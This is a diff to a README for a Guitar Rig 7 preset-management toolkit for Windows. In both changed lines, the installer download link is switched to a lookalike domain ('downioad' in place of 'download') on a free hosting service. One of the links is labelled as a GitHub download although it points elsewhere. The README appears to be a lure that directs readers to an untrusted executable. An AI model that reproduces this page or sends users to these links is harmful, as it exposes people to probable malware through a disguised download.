@@ -2,7 +2,7 @@
 
 Welcome to the Guitar Rig 2026 Pro Preset Toolkit, a dedicated utility designed to enhance your experience with Guitar Rig 7. This tool provides advanced preset management, organization, and customization features for guitarists and producers looking to streamline their workflow and expand their tonal palette on Windows systems.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## Key Features
 
@@ -44,7 +44,7 @@ A: Please use the "Settings" menu within the application to manually point it to
 
 Get the latest version of the installer here.
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
 
 ---
 *This project is an independent utility and is not affiliated with, endorsed by, or connected to Native Instruments GmbH in any way. "Guitar Rig" is a registered trademark of Native Instruments GmbH. © 2026 Toolkit Developer.*
